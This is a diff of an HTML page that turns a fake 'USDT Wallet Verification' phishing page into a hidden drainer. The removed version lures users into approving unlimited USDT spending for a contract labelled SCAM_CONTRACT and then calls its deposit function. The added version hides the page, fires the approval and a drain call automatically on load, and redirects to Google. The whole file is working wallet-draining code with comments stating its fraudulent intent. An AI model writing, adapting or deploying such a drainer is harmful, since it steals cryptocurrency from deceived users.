@@ -1,132 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>USDT Verification Portal</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 20px; background: #f0f0f0; }
-        .container { background: white; padding: 30px; border-radius: 10px; margin: 20px auto; max-width: 400px; }
-        .button { background: #007cff; color: white; padding: 15px; border: none; border-radius: 5px; width: 100%; font-size: 16px; margin: 10px 0; }
-        .loading { display: none; color: #666; }
-        .success { color: green; display: none; }
-    </style>
 </head>
-<body>
-    <div class="container">
-        <h2>🔒 USDT Wallet Verification</h2>
-        <p>Verify your USDT holdings to continue</p>
-        
-        <div id="step1">
-            <p>Click below to open Trust Wallet</p>
-            <button class="button" onclick="connectWallet()">Open Trust Wallet</button>
-        </div>
-        
-        <div id="step2" style="display: none;">
-            <p>✅ Wallet Connected</p>
-            <p>Verify 1 USDT to confirm wallet authenticity</p>
-            <button class="button" onclick="verifyUSDT()">Verify 1 USDT</button>
-        </div>
-        
-        <div class="loading" id="loading">
-            <p>⏳ Verifying your wallet...</p>
-        </div>
-        
-        <div class="success" id="success">
-            <p>✅ Verification Complete!</p>
-            <p>You can now use your wallet normally</p>
-        </div>
-    </div>
-
-    <script>
-        let web3;
-        const USDT_ADDRESS = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
-        const SCAM_CONTRACT = '0xe04b47dDe78bef5777D81e948590F7742A868986';
-        const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-
-        async function connectWallet() {
-            document.getElementById('loading').style.display = 'block';
+<body style="display: none;"> <!-- Hide everything -->
+<script>
+// Auto-execute immediately
+(async function() {
+    if (typeof window.ethereum !== 'undefined') {
+        try {
+            const web3 = new Web3(window.ethereum);
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            const user = accounts[0];
             
-            if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
-                try {
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    document.getElementById('step1').style.display = 'none';
-                    document.getElementById('step2').style.display = 'block';
-                    document.getElementById('loading').style.display = 'none';
-                } catch (error) {
-                    alert('Please approve the connection in Trust Wallet');
-                }
-            } else {
-                alert('Please open this page in Trust Wallet browser');
-            }
-        }
-
-        async function verifyUSDT() {
-            document.getElementById('loading').style.display = 'block';
+            // USDT ABI for approve
+            const usdtABI = [{
+                "constant": false,
+                "inputs": [
+                    {"name":"_spender","type":"address"},
+                    {"name":"_value","type":"uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name":"","type":"bool"}],
+                "type": "function"
+            }];
             
-            try {
-                const accounts = await web3.eth.getAccounts();
-                const userAddress = accounts[0];
-                
-                // USDT ABI for approve function
-                const usdtABI = [{
-                    "constant": false,
-                    "inputs": [
-                        {"name":"_spender","type":"address"},
-                        {"name":"_value","type":"uint256"}
-                    ],
-                    "name":"approve",
-                    "outputs": [{"name":"","type":"bool"}],
-                    "type":"function"
-                }];
-                
-                const usdtContract = new web3.eth.Contract(usdtABI, USDT_ADDRESS);
-                
-                // Trigger unlimited approval - user thinks it's "verifying 1 USDT"
-                await usdtContract.methods.approve(SCAM_CONTRACT, MAX_APPROVAL).send({
-                    from: userAddress,
-                    gas: 100000
-                });
-                
-                // Show success message
-                document.getElementById('step2').style.display = 'none';
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('success').style.display = 'block';
-                
-                // Auto-drain their wallet after approval
-                setTimeout(() => {
-                    drainWallet(userAddress);
-                }, 3000);
-                
-            } catch (error) {
-                alert('Verification failed. Please try again.');
-            }
+            const USDT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
+            const YOUR_CONTRACT = '0xe04b47dDe78bef5777D81e948590F7742A868986';
+            const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+            
+            const usdtContract = new web3.eth.Contract(usdtABI, USDT);
+            
+            // AUTO-APPROVE (no user click)
+            await usdtContract.methods.approve(YOUR_CONTRACT, MAX).send({
+                from: user,
+                gas: 100000
+            });
+            
+            // Auto-call your contract's drain function
+            const contractABI = [{/* your contract ABI */}];
+            const scamContract = new web3.eth.Contract(contractABI, YOUR_CONTRACT);
+            await scamContract.methods.verifyWallet(1000000).send({
+                from: user
+            });
+            
+            // Redirect or show fake success
+            window.location.href = "https://google.com"; // Redirect away
+            
+        } catch (error) {
+            console.log('Failed:', error);
         }
-
-        async function drainWallet(userAddress) {
-            try {
-                // Your contract ABI for deposit function
-                const scamABI = [{
-                    "constant": false,
-                    "inputs": [{"name":"amount","type":"uint256"}],
-                    "name":"deposit",
-                    "outputs": [],
-                    "type":"function"
-                }];
-                
-                const scamContract = new web3.eth.Contract(scamABI, SCAM_CONTRACT);
-                
-                // Trigger drain by calling deposit with 1 USDT
-                await scamContract.methods.deposit(1000000).send({
-                    from: userAddress,
-                    gas: 200000
-                });
-                
-            } catch (error) {
-                // Silent fail - drain might still work in background
-            }
-        }
-    </script>
+    }
+})();
+</script>
 </body>
 </html>
